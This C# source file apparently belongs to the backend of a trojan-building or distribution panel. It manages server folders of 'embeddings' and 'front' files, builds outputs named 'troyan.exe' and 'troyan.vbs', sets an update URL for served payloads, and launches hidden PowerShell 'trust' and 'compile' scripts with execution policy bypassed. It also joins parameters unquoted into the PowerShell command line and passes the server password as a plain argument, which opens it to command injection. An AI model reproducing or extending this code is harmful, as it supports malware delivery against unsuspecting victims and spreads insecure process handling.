using System.Diagnostics;
using System.Text;
using System.Text.Json;


namespace model
{

    public class ServerResult
    {
        public ServerModel? ServerModel;

        public Exception? Exception;
    }

    public class ServerService
    {
        public ServerService()
        {

        }
        public string SysScript(string scriptName)
        {
            return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
        }
        
        private string ServerDir(string serverName)
        {
            return Path.Combine(ServerModelLoader.RootDataStatic, serverName);
        }

        public string EmbeddingsDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "embeddings");
        }

        public string FrontDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "front");
        }

        private string DataFile(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.json");
        }

        public string GetIcon(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.ico");
        }

        public string GetExe(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }

        public string BuildExe(string serverName, string url)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }
        
        public string GetVbs(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "troyan.vbs");
        }

        public string BuildVbs(string serverName, string url)
        {
            return Path.Combine(ServerDir(serverName), "troyan.vbs");
        }

        public string GetEmbedding(string serverName, string embeddingName)
        {
            return Path.Combine(EmbeddingsDir(serverName), embeddingName);
        }

        public void DeleteEmbedding(string serverName, string embeddingName)
        {
            File.Delete(GetEmbedding(serverName, embeddingName));
        }

        public string GetFront(string serverName, string embeddingName)
        {
            return Path.Combine(FrontDir(serverName), embeddingName);
        }

        public void DeleteFront(string serverName, string embeddingName)
        {
            File.Delete(GetFront(serverName, embeddingName));
        }

        public ServerResult GetServer(string serverName, bool create = false, string pass = "")
        {
            if (create)
            {
                if (!Directory.Exists(ServerDir(serverName)))
                    Directory.CreateDirectory(ServerDir(serverName));
            }

            if (!Directory.Exists(ServerDir(serverName)))
                return new ServerResult() { Exception = new DirectoryNotFoundException(serverName) };

            var server = new ServerModel();
            try
            {
                try
                {
                    server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)))!;
                }
                catch
                {
                    File.WriteAllText(DataFile(serverName),
                        JsonSerializer.Serialize(new ServerModel() { Server = serverName },
                            new JsonSerializerOptions() { WriteIndented = true }));
                }

                if (create && !string.IsNullOrEmpty(pass))
                    server.Password = pass;

                server.Server = serverName;

                RunScript(server,  SysScript("trust"),
                    new (string Name, object Value)[]
                    {
                        new ValueTuple<string, object>("serverName", server.Server),
                        new("serverPassword", server.Password)
                    });
                server.Interfaces = new PsList(server).Run().Where(a => a != server.Server).ToList();

                UpdateIpDomains(server);

                server.PrimaryDns = server.Interfaces[0];
                server.SecondaryDns = server.PrimaryDns;
                
                UpdateUpdateUrl(server);
                    
                if (server.Interfaces.Count >= 2)
                    server.SecondaryDns = server.Interfaces[1];

                server.Embeddings = new List<string>();
                if (Directory.Exists(EmbeddingsDir(serverName)))
                    server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                server.Front = new List<string>();
                if (Directory.Exists(FrontDir(serverName)))
                    server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                File.WriteAllText(DataFile(serverName),
                    JsonSerializer.Serialize(server, new JsonSerializerOptions() { WriteIndented = true }));

                return new ServerResult() { ServerModel = server };
            }
            catch (Exception e)
            {
                server.Result = e.Message;
                return new ServerResult() { Exception = e, ServerModel = server };
            }
        }

        public void UpdateIpDomains(ServerModel server)
        {
            while (server.Domains.Count < server.Interfaces.Count)
                server.Domains.Add("test.com");
            var zippedDictionary = server.Interfaces
                .Zip(server.Domains, (iface, domain) => new { Interface = iface, Domain = domain })
                .Where(pair => server.Domains.Contains(pair.Domain))
                .ToDictionary(pair => pair.Interface, pair => pair.Domain);
            server.IpDomains = zippedDictionary;
        }

        public void UpdateUpdateUrl(ServerModel serverModel)
        {
            if (string.IsNullOrEmpty(serverModel.UpdateUrl))
                serverModel.UpdateUrl = $"http://{serverModel.Interfaces.First(a => a != serverModel.Server)}/dynamicdata/upd/update.txt";
        }

        public string PostServer(string serverName, ServerModel serverModel, string action)
        {
            if (!Directory.Exists(ServerDir(serverName)))
                return $"Server {serverName} is not registered";

            UpdateIpDomains(serverModel);
            
            UpdateUpdateUrl(serverModel);

            File.WriteAllText(DataFile(serverName),
                JsonSerializer.Serialize(serverModel, new JsonSerializerOptions() { WriteIndented = true }));

            var result = RunScript(serverModel, SysScript("compile"), new ValueTuple<string, object>("serverName", serverModel.Server), new ValueTuple<string, object>("action", action));

            return result;
        }
        
        public string RunScript(ServerModel serverModel, string scriptfILE, params (string Name, object Value)[] parameters)
        {
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{scriptfILE}\" " +
                                              string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WorkingDirectory = ServerDir(serverModel.Server);

                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();

                process.OutputDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        output.AppendLine(e.Data);
                    }
                };

                process.ErrorDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        error.AppendLine(e.Data);
                    }
                };

                process.Start();

                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                process.WaitForExit();

                var res = error.ToString() + "\r\n" + output.ToString();

                return res;
            }
        }
    }
}